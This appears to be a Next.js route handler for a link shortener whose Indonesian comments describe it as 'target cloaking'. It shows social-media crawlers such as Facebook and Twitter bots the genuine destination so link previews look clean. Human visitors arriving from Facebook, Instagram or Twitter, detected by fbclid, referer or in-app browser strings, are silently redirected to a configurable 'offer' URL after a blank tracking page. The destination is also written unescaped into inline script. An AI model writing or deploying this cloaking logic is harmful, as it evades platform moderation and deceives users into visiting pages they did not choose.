import { NextResponse } from 'next/server';
import { supabase } from '@/data/supabase';

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> }
) {
  // 1. Ambil Slug
  const { slug } = await params;

  // 2. Ambil Data Link & Settings
  const [linkResult, settingsResult] = await Promise.all([
    supabase.from('links').select('url, clicks').eq('id', slug).single(),
    supabase.from('settings').select('*').eq('id', 1).single()
  ]);

  const entry = linkResult.data;
  const settings = settingsResult.data;

  // 3. Kalau Link Gak Ada -> 404
  if (linkResult.error || !entry) {
    const url = new URL(request.url);
    return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
  }

  // --- SETTINGAN ---
  const OFFER_URL = settings?.offer_url || "";
  const IS_OFFER_ACTIVE = settings?.offer_active || false;
  const HISTATS_ID = settings?.histats_id || "0";
  const DELAY_MS = settings?.delay_ms || 2000;
  const SITE_NAME = settings?.site_name || "Loading...";

  // --- DETEKSI PENGUNJUNG ---
  const urlObj = new URL(request.url);
  const userAgent = (request.headers.get('user-agent') || "").toLowerCase(); // Kecilkan semua huruf biar gampang dicek
  const referer = (request.headers.get('referer') || "").toLowerCase();

  // A. DETEKSI ROBOT/CRAWLER (Yg suka ngintip link buat preview gambar)
  // Penting: "facebookexternalhit" adalah bot. "fban/fbav" adalah manusia.
  const isBot = /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|discordbot|googlebot|bingbot|baiduspider|curl|wget/i.test(userAgent);

  // B. DETEKSI MANUSIA DARI FACEBOOK (Target Cloaking)
  // 1. Cek Parameter URL
  const hasFbclid = urlObj.searchParams.has('fbclid');
  
  // 2. Cek Referer (Datang dari domain facebook/instagram)
  const isFromSocial = referer.includes('facebook') || referer.includes('fb.com') || referer.includes('instagram') || referer.includes('t.co'); // t.co = twitter
  
  // 3. Cek Browser Bawaan Aplikasi (In-App Browser)
  // fban = Facebook Android, fbav = Facebook App Version, instagram = Instagram App
  const isInAppBrowser = /fban|fbav|fb_iab|instagram|fbiossdk/i.test(userAgent);

  // GABUNGAN: Apakah ini Target Kita?
  const isTargetVisitor = hasFbclid || isFromSocial || isInAppBrowser;

  // --- LOGIKA REDIRECT UTAMA ---
  
  // KASUS 1: Kalo BOT -> Kasih Link Asli (Biar preview gambar di FB muncul bagus)
  if (isBot) {
    return NextResponse.redirect(entry.url, { status: 307 });
  }

  // KASUS 2: Kalo MANUSIA -> Hitung Klik & Cek Offer
  const newCount = (entry.clicks || 0) + 1;
  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();

  // Tentukan Tujuan Akhir
  let finalDestination = entry.url;

  // JIKA: Fitur Aktif DAN Pengunjung adalah Target (FB/IG) -> Belok ke Offer
  if (IS_OFFER_ACTIVE && isTargetVisitor) {
    finalDestination = OFFER_URL;
  }

  // --- TAMPILAN UNTUK MANUSIA (Loading Putih + Histats) ---
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${SITE_NAME}</title>
      <style>
        body { background-color: #ffffff; margin: 0; height: 100vh; overflow: hidden; }
      </style>
    </head>
    <body>
      <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,${HISTATS_ID},4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
          var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
          hs.src = ('//s10.histats.com/js15_as.js');
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
      </script>
      <noscript>
        <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
      </noscript>

      <script>
        setTimeout(function() {
          window.location.replace("${finalDestination}");
        }, ${DELAY_MS});
      </script>
    </body>
    </html>
  `;

  return new NextResponse(htmlContent, {
    headers: { 'Content-Type': 'text/html' },
  });
}
